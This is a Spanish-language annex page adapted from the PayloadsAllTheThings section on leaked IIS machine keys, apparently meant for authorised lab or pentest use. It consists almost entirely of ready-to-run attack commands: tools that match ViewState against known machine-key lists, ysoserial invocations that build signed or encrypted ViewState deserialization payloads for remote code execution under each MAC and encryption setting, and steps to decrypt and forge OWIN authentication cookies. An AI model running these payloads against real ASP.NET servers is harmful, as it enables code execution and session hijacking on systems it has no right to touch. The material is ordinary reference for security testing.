# Exposición de API keys y secretos: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [API Key Leaks/IIS-Machine-Keys.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/API%20Key%20Leaks/IIS-Machine-Keys.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. IIS Machine Keys / Viewstate Format

### Variantes presentes en tablas o texto del apartado

```text
EnableViewStateMac=False
ViewStateEncryptionMode=False
EnableViewStateMac=True
ViewStateEncryptionMode=True
False
/wEP
```

## 2. IIS Machine Keys / Machine Key Format And Locations

```xml
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto (default) | DES | 3DES | AES | alg:algorithm_name]" />
```

```xml
<machineKey validationKey="{CLAVE_REDACTADA}" decryptionKey="{CLAVE_REDACTADA}" validation="SHA1" />
```

### Variantes presentes en tablas o texto del apartado

```text
C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4
HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey
```

## 3. IIS Machine Keys / Identify Known Machine Key

```powershell
    ./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt
    ____   ____.__                       __         .__   __
    \   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________ 
    \   Y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \
    \     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/
    \___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|   
                    \/           \/            \/          \/    \/       

    KEY FOUND!!!
    Host:   
    Validation Key: XXXXX,XXXXX
```

```ps1
    python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6
    Matching MachineKeys found!
    validationKey: {CLAVE_REDACTADA} validationAlgo: SHA1
```

```ps1
    python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -r
    python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -mrd 5
    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -u http://update.microsoft.com/
    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://10.10.10.10:8080/
    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://10.10.10.10:8080/a1/b/c1/
```

```powershell
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
```

```powershell
    $ viewgen --guess "/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
    [+] ViewState is not encrypted
    [+] Signature algorithm: SHA1
```

## 4. IIS Machine Keys / Decode ViewState

```powershell
    viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
```

## 5. IIS Machine Keys / Generate ViewState For RCE

### Variantes presentes en tablas o texto del apartado

```text
__VIEWSTATE
__VIEWSTATEGENERATOR
```

## 6. Generate ViewState For RCE / MAC Is Not Enabled

```ps1
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami"
```

## 7. Generate ViewState For RCE / MAC Is Enabled And Encryption Is Disabled

```ps1
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    # --modifier = `__VIEWSTATEGENERATOR` parameter value
    # --encrypteddata = `__VIEWSTATE` parameter value of the target application
```

```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=CA0B0334 --validationalg="SHA1" --validationkey="{CLAVE_REDACTADA}"
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="{CLAVE_REDACTADA}"

    # --generator = `__VIEWSTATEGENERATOR` parameter value
    # --validationkey = validation key from the previous command
```

### Variantes presentes en tablas o texto del apartado

```text
AspDotNetWrapper.exe
TextFormattingRunProperties
```

## 8. Generate ViewState For RCE / MAC Is Enabled And Encryption Is Enabled

```ps1
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="{CLAVE_REDACTADA}" --isdebug
```

```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="{CLAVE_REDACTADA}" --validationalg="HMACSHA256" --validationkey="{CLAVE_REDACTADA}"
```

### Variantes presentes en tablas o texto del apartado

```text
HMACSHA256
__VIEWSTATEGENERATOR
--apppath="/testaspx/"
__VIEWSTATE
__VIEWSTATEENCRYPTED
compatibilityMode="Framework45"
```

## 9. IIS Machine Keys / Edit Cookies Con The Machine Key

```powershell
# decrypt cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
